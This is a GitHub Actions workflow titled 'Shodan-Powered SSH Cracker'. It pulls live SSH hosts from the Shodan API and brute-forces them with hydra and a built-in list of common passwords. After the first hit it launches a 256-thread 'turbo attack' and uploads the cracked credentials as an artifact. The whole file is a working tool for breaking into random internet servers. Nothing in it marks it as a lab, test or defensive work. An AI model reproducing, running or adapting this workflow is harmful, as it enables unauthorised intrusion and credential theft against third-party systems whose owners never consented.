name: ­şöÑ Shodan-Powered SSH Cracker

on:
  workflow_dispatch:

jobs:
  shodan-crack:
    runs-on: ubuntu-latest
    steps:
      - name: ÔÜí Install tools
        run: |
          sudo apt update
          sudo apt install -y hydra sshpass jq curl

      - name: ­şôÜ Build dictionaries
        run: |
          cat > quick.txt <<'EOF'
          123456
          password
          root
          admin
          12345
          qwerty
          abc123
          letmein
          welcome
          toor
          EOF

          cat > full.txt <<'EOF'
          123456
          password
          root
          admin
          12345
          qwerty
          abc123
          letmein
          welcome
          toor
          12345678
          password123
          admin123
          root123
          ubuntu
          test
          1q2w3e
          1qaz2wsx
          qwerty123
          admin@123
          root@123
          passw0rd
          changeme
          P@ssw0rd
          123123
          123456789
          EOF

      - name: ­şÄ» Fetch live SSH hosts from Shodan
        id: shodan
        run: |
          curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22&size=100" > shodan.json
          jq -r '.matches[] | .ip_str + ":22"' shodan.json > targets.txt
          count=$(wc -l < targets.txt)
          echo "Found $count targets"
          if [ $count -eq 0 ]; then
            exit 1
          fi
          echo "target_count=$count" >> $GITHUB_OUTPUT

      - name: ­şöü Phase 1 - Quick probe
        id: probe
        run: |
          users="root admin ubuntu pi"
          found=""
          while read line; do
            [ -z "$line" ] && continue
            ip=$(echo "$line" | cut -d: -f1)
            port=$(echo "$line" | cut -d: -f2)
            for user in $users; do
              echo "[*] Probing $user@$ip:$port"
              hydra -l "$user" -P quick.txt -s "$port" -t 10 -f -o probe.log "$ip" ssh > /dev/null 2>&1
              if grep -q "host: $ip.*password:" probe.log; then
                pass=$(grep "host: $ip.*password:" probe.log | head -1 | awk -F 'password: ' '{print $2}')
                echo "Ô£à FOUND: $ip:$port|$user|$pass"
                echo "$ip|$port|$user|$pass" > vulnerable_host.txt
                found="yes"
                break 3
              fi
            done
          done < targets.txt
          if [ "$found" = "yes" ]; then
            echo "success=true" >> $GITHUB_OUTPUT
          else
            exit 1
          fi

      - name: ­şÜÇ Phase 2 - Full turbo attack
        if: steps.probe.outputs.success == 'true'
        run: |
          IFS='|' read -r ip port user init_pass < vulnerable_host.txt
          echo "­şÄ» Attacking $user@$ip:$port"
          hydra -l "$user" -P full.txt -s "$port" -t 256 -w 3 -f -o hydra_full.log "$ip" ssh 2>/dev/null
          if grep -q "host: $ip.*password:" hydra_full.log; then
            final_pass=$(grep "host: $ip.*password:" hydra_full.log | head -1 | awk -F 'password: ' '{print $2}')
            echo "$ip:$port|$user|$final_pass" > final_creds.txt
          else
            echo "$ip:$port|$user|$init_pass" > final_creds.txt
          fi
          cat final_creds.txt

      - name: ­şôĞ Upload credentials
        uses: actions/upload-artifact@v4
        with:
          name: cracked-creds
          path: final_creds.txt
